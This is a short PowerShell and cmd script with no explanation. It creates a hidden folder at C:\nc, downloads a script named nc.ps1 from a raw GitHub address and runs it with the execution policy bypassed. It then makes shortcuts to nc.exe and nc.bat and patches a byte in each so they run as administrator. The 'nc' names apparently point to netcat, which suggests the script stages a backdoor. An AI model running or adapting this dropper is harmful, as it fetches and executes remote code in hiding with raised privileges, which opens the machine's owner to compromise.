cmd /c "md C:\nc"
cmd /c "attrib +h C:\nc"
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc.ps1","C:\nc\nc.ps1")
Powershell.exe -ExecutionPolicy Bypass C:\nc\nc.ps1



$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\nc\nc.lnk")
$Shortcut.TargetPath = "C:\nc\nc.exe"
$Shortcut.Save()
$bytes = [System.IO.File]::ReadAllBytes("C:\nc\nc.lnk")
$bytes[0x15] = $bytes[0x15] -bor 0x20 #set byte 21 (0x15) bit 6 (0x20) ON
[System.IO.File]::WriteAllBytes("C:\nc\nc.lnk", $bytes)

$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\nc\nc.bat.lnk")
$Shortcut.TargetPath = "C:\nc\nc.bat"
$Shortcut.Save()
$bytes = [System.IO.File]::ReadAllBytes("C:\nc\nc.bat.lnk")
$bytes[0x15] = $bytes[0x15] -bor 0x20 #set byte 21 (0x15) bit 6 (0x20) ON
[System.IO.File]::WriteAllBytes("C:\nc\nc.bat.lnk", $bytes)
